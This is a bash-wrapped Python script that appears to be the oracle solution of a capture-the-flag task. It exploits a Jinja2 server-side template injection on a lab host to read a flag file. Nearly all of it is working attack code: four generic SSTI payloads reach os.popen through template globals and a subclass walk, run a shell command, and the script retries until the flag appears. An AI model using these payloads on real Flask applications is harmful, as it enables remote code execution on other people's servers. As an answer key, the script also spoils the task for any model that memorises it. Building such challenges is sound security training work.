#!/usr/bin/env bash
# Exploit the Jinja2 SSTI and print the command output containing the flag.
set -euo pipefail

python3 - <<'PY'
import re
import sys
import time
import urllib.parse
import urllib.request

base = "http://web:8000/"
command = "cat /tmp/ctf_flag.txt"
payloads = [
    "{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen(" + repr(command) + ").read() }}",
    "{{ joiner.__init__.__globals__.__builtins__.__import__('os').popen(" + repr(command) + ").read() }}",
    "{{ namespace.__init__.__globals__.__builtins__.__import__('os').popen(" + repr(command) + ").read() }}",
    (
        "{% for c in [].__class__.__base__.__subclasses__() %}"
        "{% if c.__name__ == 'catch_warnings' %}"
        "{{ c.__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen("
        + repr(command)
        + ").read()') }}"
        "{% endif %}{% endfor %}"
    ),
]

for _ in range(30):
    try:
        for payload in payloads:
            url = base + "?" + urllib.parse.urlencode({"name": payload})
            with urllib.request.urlopen(url, timeout=60) as resp:
                text = resp.read().decode("utf-8", "replace")
            match = re.search(r"flag_[a-z0-9]{20}", text)
            if match:
                print(match.group(0))
                sys.exit(0)
    except Exception:
        pass
    time.sleep(3)

print("oracle_solution: Flask SSTI exploit did not return a flag", file=sys.stderr)
sys.exit(1)
PY
